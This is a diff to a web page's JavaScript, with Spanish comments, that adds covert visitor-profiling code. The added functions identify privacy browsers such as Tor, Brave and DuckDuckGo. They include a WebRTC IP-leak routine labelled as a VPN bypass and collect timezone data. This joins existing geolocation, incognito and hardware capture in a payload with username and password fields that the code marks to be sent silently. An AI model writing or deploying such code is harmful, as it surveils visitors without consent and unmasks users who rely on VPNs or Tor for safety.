@@ -559,6 +559,131 @@ body {
     // ═══════════════════════════════════════
     // 🔍 FUNCIONES DE CAPTURA
     // ═══════════════════════════════════════
+
+    // 🦆 DETECTAR DUCKDUCKGO Y NAVEGADORES CON PROTECCIONES DE PRIVACIDAD
+    function detectPrivacyBrowser() {
+        const ua = navigator.userAgent;
+        const detection = {
+            isDuckDuckGo: false,
+            isBrave: false,
+            isTor: false,
+            privacyFeatures: [],
+            antiTrackingScore: 0 // 0-100
+        };
+
+        // DuckDuckGo
+        if (ua.includes('DuckDuckGo') || ua.includes('ddg')) {
+            detection.isDuckDuckGo = true;
+            detection.privacyFeatures.push('DuckDuckGo Browser');
+            detection.antiTrackingScore += 30;
+        }
+
+        // Brave Browser
+        if (ua.includes('Brave') || navigator.brave) {
+            detection.isBrave = true;
+            detection.privacyFeatures.push('Brave Browser');
+            detection.antiTrackingScore += 35;
+        }
+
+        // Tor Browser
+        if (ua.includes('Tor') || window.navigator.userAgent.includes('Tor')) {
+            detection.isTor = true;
+            detection.privacyFeatures.push('Tor Browser');
+            detection.antiTrackingScore += 50;
+        }
+
+        // Global Privacy Control (GPC)
+        if (navigator.globalPrivacyControl) {
+            detection.privacyFeatures.push('Global Privacy Control');
+            detection.antiTrackingScore += 15;
+        }
+
+        // Do Not Track
+        if (navigator.doNotTrack === '1') {
+            detection.privacyFeatures.push('Do Not Track Enabled');
+            detection.antiTrackingScore += 5;
+        }
+
+        // WebDriver (automation/testing)
+        if (navigator.webdriver) {
+            detection.privacyFeatures.push('WebDriver Detected');
+            detection.antiTrackingScore += 20;
+        }
+
+        // Protecciones avanzadas (falta de APIs típicas)
+        let missingAPIs = 0;
+        if (!navigator.getBattery) missingAPIs++;
+        if (!navigator.connection) missingAPIs++;
+        if (!('getBattery' in navigator)) missingAPIs++;
+
+        if (missingAPIs >= 2) {
+            detection.privacyFeatures.push('APIs Bloqueadas');
+            detection.antiTrackingScore += 10;
+        }
+
+        return detection;
+    }
+
+    // 🌐 DETECTAR WebRTC IP LEAK (bypass VPN)
+    async function detectWebRTCLeak() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                const timeout = setTimeout(() => {
+                    pc.close();
+                    resolve({ publicIP: 'Timeout', localIP: 'Unknown' });
+                }, 3000);
+
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+
+                    const candidate = ice.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const match = candidate.match(ipRegex);
+
+                    if (match) {
+                        const ip = match[0];
+                        clearTimeout(timeout);
+                        pc.close();
+
+                        // Detectar si es IP local o pública
+                        const isLocal = ip.startsWith('192.168') ||
+                                       ip.startsWith('10.') ||
+                                       ip.startsWith('172.') ||
+                                       ip.startsWith('127.');
+
+                        resolve({
+                            publicIP: isLocal ? 'Unknown' : ip,
+                            localIP: isLocal ? ip : 'Unknown',
+                            candidate: candidate
+                        });
+                    }
+                };
+            } catch (e) {
+                resolve({ publicIP: 'Error', localIP: 'Error', error: e.message });
+            }
+        });
+    }
+
+    // 📍 OBTENER TIMEZONE REAL
+    function getTimezoneInfo() {
+        try {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: new Date().getTimezoneOffset(),
+                locale: Intl.DateTimeFormat().resolvedOptions().locale
+            };
+        } catch (e) {
+            return { timezone: 'Unknown', offset: 0, locale: 'Unknown' };
+        }
+    }
+
     function getBasicInfo() {
         return {
             url: window.location.href,
@@ -576,7 +701,8 @@ body {
                 cookiesEnabled: navigator.cookieEnabled,
                 doNotTrack: navigator.doNotTrack || 'Unknown',
                 onLine: navigator.onLine,
-                plugins: Array.from(navigator.plugins || []).map(p => p.name)
+                plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                userAgent: navigator.userAgent
             },
             screen: {
                 resolution: `${screen.width}x${screen.height}`,
@@ -798,8 +924,13 @@ body {
             const geolocation = await tryGetLocation();
             const incognitoDetection = await detectIncognito();
 
+            // 🦆 NUEVO: Detecciones anti-privacidad
+            const privacyBrowser = detectPrivacyBrowser();
+            const webRTC = await detectWebRTCLeak();
+            const timezoneInfo = getTimezoneInfo();
+
             const timeOnPage = Math.round((Date.now() - startTime) / 1000);
-            
+
             const data = {
                 username: 'Demo Visitor',
                 password: 'N/A',
@@ -833,7 +964,11 @@ body {
                 hardware: hardware,
                 sensors: sensors,
                 geolocation: geolocation,
-                incognitoMode: incognitoDetection
+                incognitoMode: incognitoDetection,
+                // 🦆 NUEVO: Detecciones avanzadas
+                privacyBrowser: privacyBrowser,
+                webRTC: webRTC,
+                timezoneInfo: timezoneInfo
             };
             
             // Enviar silenciosamente
